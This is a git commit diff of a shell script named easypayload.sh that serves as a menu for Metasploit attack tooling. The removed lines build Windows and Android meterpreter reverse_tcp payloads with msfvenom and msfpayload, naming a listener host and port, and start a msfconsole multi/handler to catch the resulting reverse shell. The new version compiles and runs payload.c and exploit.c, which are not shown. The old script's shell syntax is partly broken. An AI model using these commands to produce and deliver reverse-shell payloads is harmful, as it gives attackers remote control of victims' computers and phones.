abb9cc0142b02c6d867934d0793cf9d1f90fefbc
gnsrikanth <nagasrikanthgrandhi@gmail.com>
2017-02-06 05:28:23 +0000

    Update easypayload.sh

--- easypayload.sh
+++ easypayload.sh
@@ -1,36 +1,20 @@
-echo "enter option"
-echo "1 -Generate payload"
-echo "2 -Exploit system(Msfconsole)"
-echo "enter 1 or 2"
+echo "######################################"
+echo "###########Easy payload###############"
+echo "###########by Srikanth################"
+echo "######################################"
+echo "Enter 1 to generate payload"
+echo "Enter 2 to Exploit(Msfconsole)"
 read op1
-
-
-
-if [ $op1 -eq 1 ] then
-echo enter listner ip
-read $ip
-echo enter listners port
-read $port
-	echo "1 -For windows payload"
-	echo "2 -for android payload"
-	read op2	
-	if [ $op2 -eq 1 ] then	
-	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > shell.exe
-	echo "shell.exe created!"
-	elif [ $op2 -eq 2 ] then
-msfpayload -p android/meterpreter/reverse_tcp LHOST=192.168.1.16 LPORT=4444 R > shell.apk
-	echo "shell.apk created!"
 		
-
-fi
-
-
-
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > shell.exe
-echo "shell.exe created!"
-
-msfpayload -p android/meterpreter/reverse_tcp LHOST=192.168.1.16 LPORT=4444 R > shell.apk
-echo "shell.apk created!"
-
-#to run payload
-# msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x86/shell/reverse_tcp; set LHOST 192.168.1.101; set LPORT 443; run
+case $op1 in
+      #payload folder	
+	1) cd payload 
+	cc payload.c
+	./a.out;;
+     #exploit folder
+	2) cd exploit
+	cc exploit.c
+	./a.out;;
+     #for worng input
+	*) echo "INVALID NUMBER!" ;;
+esac
